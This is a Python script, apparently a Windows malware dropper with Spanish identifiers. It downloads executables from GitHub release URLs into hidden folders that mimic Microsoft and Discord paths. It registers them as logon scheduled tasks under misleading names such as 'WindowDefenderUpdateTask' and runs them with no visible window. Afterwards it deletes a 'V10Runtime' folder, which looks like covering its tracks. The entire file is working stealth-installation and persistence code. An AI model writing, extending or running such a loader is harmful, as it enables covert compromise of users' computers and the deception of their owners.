import os
import subprocess
import urllib.request
from pathlib import Path

URL_PROGRAMA_1 = "https://github.com/zzlasdf/update/releases/download/update/update.exe"
URL_PROGRAMA_2 = "https://github.com/TU_USUARIO/TU_REPOSITORIO/releases/download/tag/segundo_programa.exe"

DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
DIRECTORIO_DISCORD_ESPECIFICO = os.path.join(
    os.environ.get("LOCALAPPDATA", "C:\\"), 
    "Discord", "app-1.0.9265", "modules", "discord_hook-1", "discord_hook", "6a2c449a768e5c"
)

RUTA_EXE_1 = os.path.join(DIRECTORIO_DISCRETO, "update.exe")
RUTA_EXE_2 = os.path.join(DIRECTORIO_DISCORD_ESPECIFICO, "DiscordHookUpdater.exe")

def descargar_archivo(url, destino):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        req = urllib.request.Request(url, headers=headers)
        
        with urllib.request.urlopen(req, timeout=30) as response, open(destino, 'wb') as out_file:
            while True:
                chunk = response.read(16384)
                if not chunk:
                    break
                out_file.write(chunk)

        subprocess.run(f'attrib +h "{destino}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def configurar_tarea(nombre_tarea, ruta_exe):
    comando = (
        f'schtasks /create /sc ONLOGON /tn "{nombre_tarea}" '
        f'/tr "\"{ruta_exe}\"" /f'
    )
    try:
        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def ejecutar_oculto(ruta_exe):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen([ruta_exe], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass

if __name__ == "__main__":
    if not os.path.exists(DIRECTORIO_DISCRETO):
        os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
        subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if not os.path.exists(DIRECTORIO_DISCORD_ESPECIFICO):
        os.makedirs(DIRECTORIO_DISCORD_ESPECIFICO, exist_ok=True)

    if descargar_archivo(URL_PROGRAMA_1, RUTA_EXE_1):
        configurar_tarea("WindowDefenderUpdateTask", RUTA_EXE_1)
        ejecutar_oculto(RUTA_EXE_1)

    if descargar_archivo(URL_PROGRAMA_2, RUTA_EXE_2):
        configurar_tarea("DiscordHookUpdater", RUTA_EXE_2)
        ejecutar_oculto(RUTA_EXE_2)

    try:
        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        subprocess.Popen(
            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
            shell=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
